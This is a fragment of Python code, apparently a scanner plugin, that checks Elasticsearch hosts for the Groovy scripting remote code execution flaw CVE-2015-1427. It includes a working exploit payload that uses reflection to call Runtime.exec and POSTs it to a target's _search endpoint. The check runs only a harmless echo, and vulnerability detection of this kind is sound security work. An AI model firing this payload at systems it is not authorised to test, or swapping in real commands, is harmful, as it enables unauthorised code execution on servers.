...
class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'rce_cve20151427'
        self.info = "Check the Elasticsearch RCE CVE-2015-1427"
        self.keyword = ['all', 'elasticsearch', 'rce', 'web', 'intranet', 'danger', 'cve_2015_1427', '9200']
    ...
    def _check(self, ip, port):
        ...
        data = {"size":1,"script_fields": {"iswin": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"echo %s\").getInputStream())).readLines()"%(file_content),"lang": "groovy"}}}
        ...
        url2 = "https://%s:%d/_search?pretty"%(ip, port) if add_web_path == "" else "http://%s:%d/%s/_search?pretty"%(ip, int(port), add_web_path)
        try:
        ...
        try:   
            req = Requester(url1, jsons=data, method='post')
            if file_content in str(req.html) and req.code == 200 and check_200_or_404(url1):
                result = "exists Elasticsearch RCE CVE-2015-1427"
                self._output(ip, port, result)
        except RequesterOpenError:
            try:
                req = Requester(url2, jsons=data, method='post')
